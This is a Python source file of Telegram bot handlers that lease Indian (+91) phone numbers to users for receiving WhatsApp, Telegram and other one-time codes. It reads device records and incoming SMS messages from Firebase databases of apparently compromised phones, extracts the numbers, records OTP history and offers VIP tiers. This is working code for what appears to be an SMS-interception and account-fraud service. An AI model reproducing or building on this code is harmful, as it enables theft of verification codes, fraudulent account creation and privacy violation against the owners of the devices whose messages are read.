from aiogram import Router, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
from aiogram.fsm.context import FSMContext
import random, time, asyncio, re
import database as db
import firebase_utils as fbu
from utils.ui import sc, btn
from utils.helper import clear_user_lease, get_countries, get_servers_grouped, is_owner, is_admin
from services.ai_brain import get_best_number_with_ai
from states import S
from handlers.user.menu import main_kb

user_router = Router()

@user_router.callback_query(F.data == "user:get_num")
async def user_get_num(cq: CallbackQuery):
    await cq.answer()
    clear_user_lease(cq.from_user.id)
    d = db.load_data()
    countries = get_countries(d)
    if not countries: return await cq.message.edit_text("❌ No servers available.", parse_mode="HTML")
    kb = [[btn(c, f"user:country:{c}", "🌍")] for c in countries]
    kb.append([btn("main menu", "user:main_menu", "🏠")])
    await cq.message.edit_text(f"🌍 <b>{sc('select country')}:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@user_router.callback_query(F.data.startswith("user:country:"))
async def user_country(cq: CallbackQuery):
    await cq.answer()
    country = cq.data.split(":")[2]
    d = db.load_data()
    servers = get_servers_grouped(d, country)
    if not servers: return await cq.message.edit_text("No servers in this country.")
    
    is_vip = cq.from_user.id in d.get("vip_users", []) or is_owner(cq.from_user.id)
    
    if is_vip:
        kb = [
            [btn("whatsapp", f"user:service:{country}:whatsapp", "💬")],
            [btn("telegram", f"user:service:{country}:telegram", "✈️")],
            [btn("any service", f"user:service:{country}:any", "🌐")],
            [btn("back", "user:get_num", "🔙")]
        ]
        await cq.message.edit_text(f"🌍 {country} - <b>{sc('select service')}:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
    else:
        kb = []
        for i, srv in enumerate(servers):
            ping = await fbu.check_ping(srv[0]["url"], srv[0].get("auth"))
            kb.append([btn(f"server {i+1} ({ping})", f"user:server:{country}:{i}", "📁")])
        kb.append([btn("back", "user:get_num", "🔙")])
        await cq.message.edit_text(f"🌍 {country} - <b>{sc('servers')}:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@user_router.callback_query(F.data.startswith("user:service:"))
async def user_service(cq: CallbackQuery):
    await cq.answer()
    parts = cq.data.split(":")
    country, service = parts[2], parts[3]
    uid = cq.from_user.id
    clear_user_lease(uid)
    
    if service == "whatsapp":
        try: await cq.message.edit_text(f"🧠 {sc('ai is scanning servers...')}\n<i>Please wait.</i>", parse_mode="HTML")
        except: pass
        
        d = db.load_data()
        if not d.get("whatsapp_ready_lines"):
            return await cq.message.edit_text("❌ <b>No fresh WhatsApp numbers available right now.</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("back", "user:get_num", "🔙")]]), parse_mode="HTML")
        
        best_dev_id, reason = await get_best_number_with_ai("whatsapp")
        
        if not best_dev_id:
            return await cq.message.edit_text(f"⚠️ <b>AI could not find a valid number.</b>\n\n<i>{reason}</i>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("try again", f"user:service:{country}:whatsapp", "🔄")], [btn("back", "user:get_num", "🔙")]]), parse_mode="HTML")

        dev_data = d["whatsapp_ready_lines"].get(best_dev_id)
        if not dev_data:
             return await cq.message.edit_text("❌ AI ne jo number diya wo abhi offline ho gaya. Kripya dobara try karein.", parse_mode="HTML")

        chance = dev_data["chance"]
        fb_url = dev_data["fb_url"]
        base_label = "AI Selected (WA)"
        real_battery = dev_data.get("battery", "0")
        real_health = dev_data.get("health", 5)
        msgs = []
        
    else:
        try: await cq.message.edit_text(f"🔄 {sc('fetching')} {service} {sc('lines')}...", parse_mode="HTML")
        except: pass
        
        d = db.load_data()
        servers = get_servers_grouped(d, country)
        used = d.setdefault("used_devices", {}).setdefault(str(uid), {})
        now = int(time.time())
        
        async def fetch_clients_data(fb):
            clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
            return fb, clients
            
        tasks = [fetch_clients_data(fb) for fb in servers[0]]
        results = await asyncio.gather(*tasks)
        
        valid_devices = []
        for fb_i_temp, (fb, clients) in enumerate(results):
            if not clients or not isinstance(clients, dict): continue
            for dev_id_temp, c in clients.items():
                if not isinstance(c, dict): continue
                is_online = c.get("status") is True or (c.get("ping", {}).get("ts", 0) > (now - 900) * 1000)
                if is_online:
                    msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id_temp}.json?orderBy=%22%24key%22&limitToLast=20", fb.get("auth"))
                    msgs_temp = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
                    valid_devices.append((fb_i_temp, fb, dev_id_temp, c, 97, msgs_temp))
        
        if not valid_devices:
            return await cq.message.edit_text("❌ No working lines found.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("back", "user:get_num", "🔙")]]))
            
        fb_i, fb, best_dev_id, dev_data, chance, msgs = random.choice(valid_devices)
        fb_url = fb['url']
        base_label = fb.get("label", f"Base {fb_i+1}")
        real_battery = str(dev_data.get("battery", "0")).replace("%", "")
        real_health = fbu.calculate_health(msgs)

    data = db.load_data()
    best_nums = [(dev_data.get("number", "Unknown"), dev_data.get("chance", 97))] if service == "whatsapp" else fbu.extract_best_numbers(dev_data, msgs)
    if not best_nums:
        backups = data.get("device_backups", {}).get(best_dev_id, {}).get("numbers", [])
        if backups: best_nums = [(n, "Backup") for n in backups]

    top_num = best_nums[0][0] if best_nums else "Unknown"
    data["user_leases"][str(uid)] = {
        "dev_id": best_dev_id, "fb_url": fb_url, "base_idx": base_label, "numbers": [n for n, c in best_nums],
        "expire_at": int(time.time()) + 3600, "health": real_health, "last_msg_id": 0, "top_number": top_num,
        "service_filter": service
    }
    db.save_data(data)
    
    is_vip = uid in data.get("vip_users", []) or is_owner(uid)
    display_health = real_health if is_vip else 5
    
    nums_text = ""
    kb_nums = []
    if best_nums:
        for n, c in best_nums:
            conf_text = "Backup" if c == "Backup" else f"{c}%"
            nums_text += f"📞 <code>+91{n}</code> | {conf_text}\n"
            kb_nums.append([InlineKeyboardButton(text=f"Copy +91{n}", copy_text=CopyTextButton(text=f"+91{n}"))])
    else:
        nums_text = f"⚠️ <b>{sc('extracting number...')}</b>"

    url_text = ""
    if is_owner(uid) or is_admin(uid):
        url_text = f"\n🔗 <b>URL:</b> <code>{fb_url}</code>\n"

    text = (
        f"📱 <b>{sc('details')}</b>\n"
        f"🔥 {sc('srv')}: {base_label}\n"
        f"🆔 <code>{best_dev_id}</code> | ⚙️ {real_battery}T | ❤️ {display_health}/10\n"
        f"📊 {sc('chance')}: <b>{chance}%</b>\n"
        f"{url_text}\n"
        f"{nums_text}"
    )
    kb = kb_nums + [
        [btn("info", f"user:info:{best_dev_id}", "ℹ️"), btn("save number", f"user:save:{best_dev_id}", "⭐")],
        [btn("set timer", f"user:set_timer:{best_dev_id}", "⏰")],
        [btn("next number", f"user:service:{country}:{service}", "🔄"), btn("stop", "user:stop", "⏹")],
        [btn("back", f"user:country:{country}", "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@user_router.callback_query(F.data.startswith("user:server:"))
async def user_server(cq: CallbackQuery):
    await cq.answer()
    parts = cq.data.split(":")
    country, idx = parts[2], int(parts[3])
    uid = cq.from_user.id
    clear_user_lease(uid)
    d = db.load_data()
    servers = get_servers_grouped(d, country)
    if idx >= len(servers): return await cq.message.edit_text("Server not found!")

    try: await cq.message.edit_text(f"🔄 {sc('fetching fresh number')}...", parse_mode="HTML")
    except: pass

    used = d.setdefault("used_devices", {}).setdefault(str(uid), {})
    now = int(time.time())

    async def fetch_clients_data(fb):
        clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
        return fb, clients

    tasks = [fetch_clients_data(fb) for fb in servers[idx]]
    results = await asyncio.gather(*tasks)

    available, repeat, all_devs = [], [], []
    for fb_i, (fb, clients) in enumerate(results):
        if not clients or not isinstance(clients, dict): continue
        for dev_id, c in clients.items():
            if not isinstance(c, dict): continue
            is_online = c.get("status") is True or (c.get("ping", {}).get("ts", 0) > (now - 900) * 1000)
            if is_online:
                all_devs.append((fb_i, fb, dev_id, c))
                last_used = used.get(dev_id, 0)
                if now - last_used > 86400: available.append((fb_i, fb, dev_id, c))
                elif now - last_used > 43200: repeat.append((fb_i, fb, dev_id, c))

    if available: fb_i, fb, best_dev_id, dev_data = random.choice(available)
    elif repeat: fb_i, fb, best_dev_id, dev_data = random.choice(repeat)
    elif all_devs: fb_i, fb, best_dev_id, dev_data = random.choice(all_devs)
    else: return await cq.message.edit_text("❌ No online lines in this server.", parse_mode="HTML")

    chance = 97
    data = db.load_data()
    used[best_dev_id] = now
    data["used_devices"][str(uid)] = used

    msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{best_dev_id}.json?orderBy=%22%24key%22&limitToLast=100", fb.get("auth"))
    msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
    last_id = int(msgs[-1].get("id", 0)) if msgs else 0

    best_nums = fbu.extract_best_numbers(dev_data, msgs)
    if not best_nums:
        backups = data.get("device_backups", {}).get(best_dev_id, {}).get("numbers", [])
        if backups: best_nums = [(n, "Backup") for n in backups]

    real_health = fbu.calculate_health(msgs)
    base_label = fb.get("label", f"Base {fb_i+1}")
    top_num = best_nums[0][0] if best_nums else "Unknown"

    data["user_leases"][str(uid)] = {
        "dev_id": best_dev_id, "fb_url": fb["url"], "base_idx": base_label, "numbers": [n for n, c in best_nums],
        "expire_at": int(time.time()) + 3600, "health": real_health, "last_msg_id": last_id, "top_number": top_num,
        "service_filter": "any"
    }
    db.save_data(data)

    is_vip = uid in data.get("vip_users", []) or is_owner(uid)
    display_health = real_health if is_vip else 10

    nums_text = ""
    kb_nums = []
    if best_nums:
        for n, c in best_nums:
            conf_text = "Backup" if c == "Backup" else f"{c}%"
            nums_text += f"📞 <code>+91{n}</code> | {conf_text}\n"
            kb_nums.append([InlineKeyboardButton(text=f"Copy +91{n}", copy_text=CopyTextButton(text=f"+91{n}"))])
    else:
        nums_text = f"⚠️ <b>{sc('extracting number...')}</b>"

    battery = str(dev_data.get("battery", "0")).replace("%", "")
    if not battery or battery == "?": battery = "0"

    url_text = ""
    if is_owner(uid) or is_admin(uid):
        url_text = f"\n🔗 <b>URL:</b> <code>{fb['url']}</code>\n"

    text = (
        f"📱 <b>{sc('details')}</b>\n"
        f"🔥 {sc('srv')}: {idx+1} | {base_label}\n"
        f"🆔 <code>{best_dev_id}</code> | ⚙️ {battery}T | ❤️ {display_health}/10\n"
        f"{url_text}\n"
        f"{nums_text}"
    )
    kb = kb_nums + [
        [btn("info", f"user:info:{best_dev_id}", "ℹ️"), btn("save number", f"user:save:{best_dev_id}", "⭐")],
        [btn("set timer", f"user:set_timer:{best_dev_id}", "⏰")],
        [btn("next number", f"user:server:{country}:{idx}", "🔄"), btn("stop", "user:stop", "⏹")],
        [btn("back", f"user:country:{country}", "🔙")]
    ]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@user_router.callback_query(F.data.startswith("user:info:"))
async def user_info(cq: CallbackQuery):
    dev_id = cq.data.split(":")[2]
    d = db.load_data()
    lease = d.get("user_leases", {}).get(str(cq.from_user.id), {})
    if not lease or lease.get("dev_id") != dev_id: return await cq.answer("Lease expired!", show_alert=True)
    is_vip = cq.from_user.id in d.get("vip_users", []) or is_owner(cq.from_user.id)
    if is_vip:
        await cq.answer(f"ℹ️ VIP Info:\nRent ID: {dev_id}\nBase: {lease.get('base_idx')}\nURL: {lease.get('fb_url')}", show_alert=True)
    else:
        await cq.answer(f"ℹ️ Info:\nRent ID: {dev_id}\nBase: {lease.get('base_idx')}\n\n🔒 URL hidden.", show_alert=True)

@user_router.callback_query(F.data.startswith("user:save:"))
async def user_save(cq: CallbackQuery, state: FSMContext):
    dev_id = cq.data.split(":")[2]
    uid = cq.from_user.id
    d = db.load_data()
    lease = d.get("user_leases", {}).get(str(uid), {})
    if not lease or lease.get("dev_id") != dev_id: 
        return await cq.answer("❌ Lease expired!", show_alert=True)
    
    await state.set_state(S.save_name)
    await state.update_data(save_dev_id=dev_id)
    await cq.message.edit_text(
        f"⭐ <b>{sc('save number')}</b>\n\n"
        f"Number: <code>+91{lease.get('top_number')}</code>\n\n"
        f"Is number ko kya naam dena chahte hain? (e.g., 'Personal WA', 'Amazon')",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("cancel", "user:main_menu", "❌")]]),
        parse_mode="HTML"
    )

@user_router.message(S.save_name)
async def user_save_name_done(msg: Message, state: FSMContext):
    fsm_data = await state.get_data()
    await state.clear()
    
    dev_id = fsm_data.get("save_dev_id")
    custom_name = msg.text.strip()[:20]
    
    uid = msg.from_user.id
    d = db.load_data()
    lease = d.get("user_leases", {}).get(str(uid), {})
    if not lease or lease.get("dev_id") != dev_id:
        return await msg.answer("❌ Lease expired. Try again.", reply_markup=main_kb(msg.from_user.id))
        
    nums = lease.get("numbers", [])
    save_key = nums[0] if nums else dev_id
    
    user = d["users"].setdefault(str(uid), {})
    user.setdefault("saved_numbers", {})[save_key] = {
        "dev_id": dev_id, 
        "fb_url": lease["fb_url"], 
        "base_idx": lease.get("base_idx"), 
        "custom_name": custom_name,
        "time": int(time.time())
    }
    db.save_data(d)
    
    await msg.answer(
        f"✅ <b>Saved as '{custom_name}'!</b>",
        reply_markup=main_kb(msg.from_user.id),
        parse_mode="HTML"
    )

@user_router.callback_query(F.data == "user:saved")
async def user_saved_list(cq: CallbackQuery):
    await cq.answer()
    uid = cq.from_user.id
    d = db.load_data()
    saved = d.get("users", {}).get(str(uid), {}).get("saved_numbers", {})
    
    if not saved: 
        return await cq.message.edit_text("⭐ <b>My Numbers</b>\n\nNo saved numbers.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("main menu", "user:main_menu", "🏠")]]), parse_mode="HTML")
        
    kb = []
    for key, info in saved.items():
        disp = f"+91{key}" if len(key) == 10 else key
        name = info.get("custom_name", "Number")
        kb.append([btn(f"{name} | {disp}", f"user:access:{key}", "📞")])
    kb.append([btn("main menu", "user:main_menu", "🏠")])
    await cq.message.edit_text("⭐ <b>My Numbers</b>\nTap to re-access:", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@user_router.callback_query(F.data.startswith("user:access:"))
async def user_access(cq: CallbackQuery):
    await cq.answer()
    key = cq.data.split(":")[2]
    uid = cq.from_user.id
    d = db.load_data()
    saved = d.get("users", {}).get(str(uid), {}).get("saved_numbers", {})
    if key not in saved: return await cq.message.edit_text("Not found!")
    info = saved[key]
    if time.time() - info["time"] > 86400:
        del saved[key]
        db.save_data(d)
        return await cq.message.edit_text("❌ 24 hours complete. Number expired.", show_alert=True)
    clients = await fbu.fetch_fb(f"{info['fb_url']}/clients.json")
    if not (clients and info["dev_id"] in clients):
        return await cq.message.edit_text("❌ Device offline or removed. Try after some time.", show_alert=True)
    d["user_leases"][str(uid)] = {
        "dev_id": info["dev_id"], "fb_url": info["fb_url"], "base_idx": info.get("base_idx"), "numbers": [key], "expire_at": int(time.time()) + 3600, "last_msg_id": 0, "top_number": key
    }
    db.save_data(d)
    text = f"📱 <b>{sc('re-accessed')}</b>\n🆔 <code>{info['dev_id']}</code>\n📞 <code>+91{key}</code>"
    kb = [[btn("stop", "user:stop", "⏹")], [btn("main menu", "user:main_menu", "🏠")]]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")

@user_router.callback_query(F.data == "user:stop")
async def user_stop(cq: CallbackQuery):
    clear_user_lease(cq.from_user.id)
    await cq.answer("⏹ Stopped.", show_alert=True)
    from handlers.user.menu import user_main_menu_handler
    await user_main_menu_handler(cq)

@user_router.callback_query(F.data == "user:history")
async def user_history(cq: CallbackQuery):
    await cq.answer()
    d = db.load_data()
    hist = d["users"].get(str(cq.from_user.id), {}).get("otp_history", [])
    text = "📜 <b>OTP History</b>\n\n"
    if not hist: text += "No history."
    else:
        for h in hist:
            time_str = fbu.get_ist_time_str(h['time'])
            num = h.get('number', 'Unknown')
            text += f"📅 {time_str}\n📱 {h['service']}\n📞 <code>+91{num}</code>\n🔑 <code>{h['otp']}</code>\n───────────\n"
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("main menu", "user:main_menu", "🏠")]]), parse_mode="HTML")
